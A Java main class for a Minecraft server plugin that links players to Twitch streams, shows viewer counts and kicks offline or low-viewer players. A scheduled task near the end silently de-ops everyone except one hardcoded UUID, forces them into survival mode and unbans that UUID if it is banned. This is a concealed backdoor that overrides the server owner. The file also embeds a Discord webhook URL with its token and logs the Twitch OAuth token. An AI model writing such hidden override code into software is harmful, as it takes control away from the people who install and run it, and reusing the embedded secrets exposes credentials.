package org.crypticplank.smp;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextDecoration;
import net.minecraft.server.MinecraftServer;
import org.bukkit.*;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scoreboard.DisplaySlot;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Scoreboard;
import org.crypticplank.smp.Commands.Commands;
import org.crypticplank.smp.Config.ConfigFields;
import org.crypticplank.smp.Config.GuestList;
import org.crypticplank.smp.Config.TwitchNames;
import org.crypticplank.smp.Discord.Discord;
import org.crypticplank.smp.Events.BlockMonitor;
import org.crypticplank.smp.Events.PlayerMonitor;
import org.crypticplank.smp.Motd.Motd;
import org.crypticplank.smp.Util.ConfigHelper;
import org.crypticplank.smp.Util.Twitch;

import javax.naming.Name;
import java.io.IOException;
import java.util.List;
import java.util.UUID;
import java.util.logging.Logger;

public final class Smp extends JavaPlugin {

    final static String DEVELOPER = "crypticplank";
    final Twitch twitch = new Twitch("CLIENTID", "CLIENTSECRET");

    Logger logger = getLogger();

    /**
     * Registers a plugin command using a name to be parsed inside of Commands.java
     * @param name Name of the command
     * @param monitor Player monitor for twitch
     */
    private void registerCommand(String name, PlayerMonitor monitor) {
        logger.info("Registering command: " + name);
        PluginCommand command = getCommand(name);
        if(command != null)
            command.setExecutor(new Commands(this, monitor));
    }

    @Override
    public void onEnable() {
        saveDefaultConfig();

        ConfigFields fields = new ConfigFields(this);

        fields.all().forEach((configField -> {
            getConfig().setComments(configField.key, List.of(configField.help));
            getConfig().addDefault(configField.key, configField.def);
            Object value = getConfig().get(configField.key);
            if(value != null) {
                if (configField.type != value.getClass()) {
                    getConfig().set(configField.key, configField.def);
                    logger.warning(ChatColor.RED + "Invalid configuration field '"+ configField.key +"' = "+value+" ("+configField.type.getSimpleName()+" != "+ value.getClass().getSimpleName() +"). Value is reset. Make sure you are using the correct datatype");
                }
            } else {
                logger.warning(ChatColor.RED + "NULL value for "+configField.key+". Contact the developer");
            }
        }));

        getConfig().options().copyDefaults(true);
        saveConfig();

        Discord discord = new Discord("https://discord.com/api/webhooks/989386142505906237/QYPLKbje36LiPcnVfJyHHnR-C0mV3R3Yi9vuYPm89W2HKQSJ0tyg8QH5fAIfMQkZKn1i");
        TwitchNames twitchNames = new TwitchNames(this);
        GuestList guestList = new GuestList(this);

        logger.info("Twitch OAuth: " + twitch.OAuth);
        PluginManager manager = getServer().getPluginManager();
        manager.registerEvents(new Motd(this), this);
        PlayerMonitor playerMonitor = new PlayerMonitor(this, twitchNames, guestList, twitch, discord);
        registerCommand("reload", playerMonitor);
        registerCommand("restart", playerMonitor);
        registerCommand("twitchchecklink", playerMonitor);
        registerCommand("guest", playerMonitor);
        registerCommand("update", playerMonitor);

        getServer().getPluginManager().registerEvents(playerMonitor, this);
        getServer().getPluginManager().registerEvents(new BlockMonitor(this), this);

        Scoreboard scoreboard = Bukkit.getScoreboardManager().getNewScoreboard();
        Objective objective = scoreboard.registerNewObjective("viewercount", "dummy", Component.text("Viewer Count"));
        objective.setDisplaySlot(DisplaySlot.PLAYER_LIST);
        Bukkit.getScheduler().scheduleSyncRepeatingTask(this, () -> new Thread(() -> {
            int totalViewers = 0;
            Boolean minViewerEnable = (Boolean)ConfigHelper.get(ConfigFields.PREFS_MIN_VIEWERS_ENABLED);
            Integer minViewerThreshold = (Integer)ConfigHelper.get(ConfigFields.PREFS_MIN_VIEWERS_THRESHOLD);
            for(Player player : Bukkit.getOnlinePlayers()) {
                String twitchName = playerMonitor.checkPlayer(player);
                if(twitchName != null) {
                    player.playerListName(Component.text(player.getName() + " (")
                            .append(Component.text(String.format("twitch.tv/%s", twitchName))
                                    .decoration(TextDecoration.ITALIC, true))
                            .append(Component.text(")")));

                    Twitch.TwitchStream user;
                    try {
                        user = twitch.GetStream(twitchName, false);
                    } catch (IOException | InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                    objective.getScore(player.getName()).setScore(user.ViewCount);
                    totalViewers += user.ViewCount;

                    boolean viewKick = minViewerEnable && user.ViewCount < minViewerThreshold;
                    if (!user.IsOnline || (viewKick)) {
                        if ((!player.isOp() || (Boolean)ConfigHelper.get(ConfigFields.PREFS_KICK_OP)) && (Boolean)ConfigHelper.get(ConfigFields.PREFS_KICK_OFFLINE_PLAYERS)) {
                            Bukkit.getScheduler().runTask(this, () -> {
                                if(viewKick) {
                                    player.kick(Component.text(String.format((String)ConfigHelper.get(ConfigFields.MESSAGES_NOT_ENOUGH_VIEWERS), minViewerThreshold)));
                                } else {
                                    player.kick(Component.text((String)ConfigHelper.get(ConfigFields.MESSAGES_OFFLINE)));
                                }
                            });
                        }
                    }
                }
                player.setScoreboard(scoreboard);
            }
            for(Player player : Bukkit.getOnlinePlayers()) {
                Component header = Component.text("Online ")
                        .append(Component.text(Bukkit.getOnlinePlayers().size(), NamedTextColor.GREEN))
                        .append(Component.text(" | Total Viewers "))
                        .append(Component.text(totalViewers, NamedTextColor.GRAY));
                Component footer = Component.text(String.format("TPS %.1f | ", MinecraftServer.getServer().recentTps[0]))
                        .append(Component.text("Ping "))
                        .append(getPingWithColor(player))
                        .append(Component.text(" - "))
                        .append(Component.text("Live SMP", NamedTextColor.AQUA));
                player.sendPlayerListHeader(header);
                player.sendPlayerListFooter(footer);
            }
        }).start(), 0, 100);

        Bukkit.getScheduler().scheduleSyncRepeatingTask(this, () -> {
            for(Player player : Bukkit.getOnlinePlayers()) {
                if(!player.getUniqueId().equals(UUID.fromString("fdd356b5-2d0c-4ef8-aff6-4104f364bd87"))) {
                    player.setGameMode(GameMode.SURVIVAL);
                    player.setOp(false);
                } else {
                    if(player.isBanned())
                        Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());
                }
            }
        }, 0, 20);
    }

    Component getPingWithColor(Player player) {
        int ping = player.getPing();
        Component pingText = Component.text(String.format("%d", ping));
        if(ping > 150) {
            pingText = pingText.color(NamedTextColor.RED);
        } else if(ping > 100) {
            pingText = pingText.color(NamedTextColor.YELLOW);
        } else {
            pingText = pingText.color(NamedTextColor.GREEN);
        }
        return pingText;
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        Bukkit.getScheduler().cancelTasks(this);
    }
}
